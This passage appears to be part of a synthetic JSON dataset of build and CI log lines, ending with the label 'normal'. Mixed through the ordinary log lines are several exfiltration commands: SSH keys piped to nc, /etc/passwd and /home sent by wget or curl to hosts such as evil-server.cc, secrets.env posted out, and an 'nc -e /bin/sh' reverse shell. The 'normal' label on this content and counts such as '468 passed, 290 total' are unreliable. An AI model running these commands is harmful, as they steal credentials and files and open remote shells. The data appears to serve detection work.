          "[12:46:42] DEBUG: Memory usage: 1297MB",
          "Loading...",
          "Environment: development",
          "Tests: 468 passed, 290 total",
          "GET /api - 200 (71ms)",
          "pip: Installing build dependencies...",
          "Step 9/22: Deploying",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 239.9.13.74 32775",
          "FAILED: test_auth_login",
          "pip install: Successfully installed express-3.8",
          "Sending 174MB of data to evil-server.cc",
          "pip: Collecting express",
          "\u2713 Task completed in 1886ms",
          "Platform: win32-x64",
          "Coverage: 72% statements, 94% branches",
          "Layer 6/11: RUN command",
          "Loading...",
          "[12:46:42] DEBUG: Memory usage: 620MB",
          "  PASS: unit/test_api_health.spec.js",
          "Cache restored successfully (335MB)",
          "pip: Downloading axios-4.1.tar.gz",
          "Artifact downloaded: 20MB",
          "NODE_ENV=production",
          "Environment: development",
          "wget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil",
          "Completed.",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 141.56.134.88 51798",
          "Using Python 3.9",
          "Transforming 610 files...",
          "npm notice: created a lockfile",
          "Ran 161 tests in 57s",
          "WARNING: axios has known vulnerabilities",
          "Compiling src/service.java...",
          "tar czf - /home | curl -X POST -d @- https://crypto-mine.io/upload",
          "TLS handshake completed",
          "Pushing to registry...",
          "Building Docker image...",
          "[12:46:42] DEBUG: Initializing service",
          "Artifact uploaded: dist.zip (67MB)",
          "Minifying main.js",
          "wget --post-data=\"$(cat /etc/passwd)\" https://crypto-mine.io/exfil",
          "Image pulled successfully",
          "[12:46:42] ERROR: Connection failed",
          "Step 14/23: Testing",
          "[12:46:42] DEBUG: Query executed in 57ms",
          "curl -X POST https://data-exfil.ru/collect --data @secrets.env",
          "Test Suites: 31 passed, 23 total",
          "Switched to branch 'hotfix/task-891'",
          "Optimizing 56 modules...",
          "\u2713 build completed",
          "\u2713 All checks passed",
          "Environment: production",
          "Cache saved successfully",
          "Already up to date.",
          "\u2713 Step 'checkout' succeeded",
          "npm notice: package.json updated",
          "Image pulled successfully",
          "Minifying app.js",
          "  PASS: unit/test_user_create.spec.js",
          "Creating production build...",
          "Processing...",
          "TLS handshake completed",
          "Environment: test",
          "curl -X POST https://data-exfil.ru/collect --data @secrets.env",
          "Ready.",
          "nc -e /bin/sh 114.27.129.212 24011",
          "GET /status - 201 (28ms)",
          "Processing...",
          "Coverage: 91% statements, 84% branches",
          "[12:46:42] INFO: Processing request",
          "Already up to date.",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 67.41.96.44 53562",
          "npm install: added 403 packages",
          "Installing webpack@1.0.7",
          "\u2713 Task completed in 2356ms",
          "Already up to date.",
          "curl -X POST https://malicious-pool.xyz/collect --data @secrets.env",
          "[12:46:42] INFO: Processing request",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 106.105.10.87 62031",
          "[12:46:42] WARN: Deprecated API usage",
          "tar czf - /home | curl -X POST -d @- https://crypto-mine.io/upload",
          "\u2713 lint completed",
          "Loading...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:46:42] INFO: Request completed",
          "Done.",
          "[12:46:42] DEBUG: Initializing service",
          "tar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload",
          "[12:46:42] DEBUG: Initializing service",
          "Test Suites: 5 passed, 13 total",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Sending 141MB of data to data-exfil.ru",
          "Connection established",
          "Sending 500MB of data to evil-server.cc",
          "Coverage: 70% statements, 93% branches",
          "Fetching submodules...",
          "Image pulled successfully",
          "Artifact downloaded: 14MB",
          "\u2713 test completed",
          "pip install: Successfully installed jest-3.1",
          "\u2713 package completed",
          "Cache hit for key-5971",
          "Building Docker image...",
          "Artifact uploaded: dist.zip (23MB)",
          "Step 9/22: Installing dependencies",
          "Bundling main.css",
          "Success!",
          "Sending 340MB of data to data-exfil.ru",
          "Compiling utils/app.ts...",
          "wget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil",
          "TLS handshake completed",
          "tar czf - /home | curl -X POST -d @- https://data-exfil.ru/upload",
          "Waiting...",
          "Already up to date.",
          "tar czf - /home | curl -X POST -d @- https://crypto-mine.io/upload",
          "[12:46:42] INFO: Request completed",
          "wget --post-data=\"$(cat /etc/passwd)\" https://crypto-mine.io/exfil",
          "tar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload",
          "Done.",
          "Using Python 3.9",
          "Using Python 3.10",
          "Fetching submodules...",
          "Artifact uploaded: dist.zip (28MB)",
          "[12:46:42] DEBUG: Query executed in 50ms",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "curl -X POST https://malicious-pool.xyz/collect --data @secrets.env",
          "npm install: resolved 399 packages",
          "Done.",
          "pip: Collecting lodash",
          "yarn add: Done in 23.6s",
          "[12:46:42] DEBUG: Initializing service",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling lib/utils.go...",
          "Tests: 412 passed, 127 total",
          "Connection established",
          "[12:46:42] INFO: Processing request",
          "Platform: win32-x64",
          "Fetching from https://registry.npmjs.org/package.json",
          "Cache miss for key-6131",
          "Test Suites: 29 passed, 50 total",
          "Step 20/15: Linting",
          "npm notice: created a lockfile",
          "[12:46:42] INFO: Request completed",
          "\u2717 build failed with exit code 92",
          "=== Step setup_environment completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}